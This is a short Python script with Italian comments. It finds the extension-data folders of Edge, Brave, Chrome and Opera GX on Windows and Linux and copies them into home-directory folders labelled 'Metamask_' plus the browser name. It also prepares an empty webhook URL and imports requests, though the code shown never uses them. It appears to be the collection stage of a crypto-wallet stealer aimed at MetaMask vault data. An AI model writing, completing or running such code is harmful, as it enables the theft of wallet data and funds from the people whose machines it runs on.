import requests
import os
import shutil
import platform

# Directory utente
user_dir = os.path.expanduser("~")

# Inserisci l'URL del webhook
webhook_url = ""

def get_extension_paths():
    extension_paths = {}
    current_os = platform.system()

    if current_os == "Windows":
        # Percorsi delle directory delle estensioni per Windows
        extension_paths = {
            "Edge": os.path.join(user_dir, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings"),
            "Brave": os.path.join(user_dir, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings"),
            "Google": os.path.join(user_dir, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings"),
            "OperaGX": os.path.join(user_dir, "AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings")
        }
    elif current_os == "Linux":
        # Percorsi delle directory delle estensioni per Linux
        extension_paths = {
            "Brave": os.path.join(user_dir, ".config/BraveSoftware/Brave-Browser/Default/Extensions"),
            "Chrome": os.path.join(user_dir, ".config/google-chrome/Default/Extensions")
        }

    return extension_paths

def copy_extension_directory(source_path, destination_path):
    try:
        if os.path.exists(source_path):
            # Copia la directory delle estensioni
            shutil.copytree(source_path, destination_path)
            return True
        return False
    except Exception as e:
        print(f"Errore durante la copia: {e}")
        return False

def collect_browser_extension_data():
    extension_paths = get_extension_paths()

    for browser_name, source_path in extension_paths.items():
        destination_path = os.path.join(user_dir, f"Metamask_{browser_name}")
        if copy_extension_directory(source_path, destination_path):
            print(f"Nuova estensione trovata: Browser - {browser_name}")
        else:
            print(f"Nessuna estensione trovata per il browser {browser_name}")

if __name__ == "__main__":
    collect_browser_extension_data()
